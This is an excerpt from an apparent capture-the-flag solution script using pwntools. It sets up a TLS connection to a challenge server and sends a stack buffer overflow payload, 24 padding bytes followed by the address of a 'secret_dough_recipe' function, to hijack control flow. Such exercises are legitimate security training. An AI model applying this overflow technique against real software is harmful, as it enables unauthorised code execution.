...
exe = context.binary = ELF(args.EXE or './recipe')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc dat-overflow-dough-a4a0616991150d43.challs.brunnerne.xyz 443'.split()
ssl = True
...
p.sendline(b'A' * 24 + p64(exe.symbols['secret_dough_recipe']))
